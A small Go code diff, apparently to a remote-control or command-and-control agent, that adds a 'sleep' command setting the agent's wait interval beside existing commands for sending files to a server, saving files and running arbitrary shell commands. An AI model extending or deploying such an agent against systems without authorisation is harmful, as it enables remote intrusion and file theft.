@@ -14,6 +14,8 @@ import (
 	"os/exec"
 	"os/user"
 	"runtime"
+	"strconv"
+	"strings"
 	"time"
 
 	ps "github.com/mitchellh/go-ps"
@@ -88,6 +90,8 @@ func executeCommand(command string, index int) (response string) {
 		response = saveFileToDisk(message.Commands[index].File)
 	case "get":
 		response = sendFileToServer(message.Commands[index].Command, index)
+	case "sleep":
+		waitTime, _ = strconv.Atoi(strings.TrimSpace(separatedCommand[1]))
 	default:
 		response = executeCommandOnShell(command)
 	}
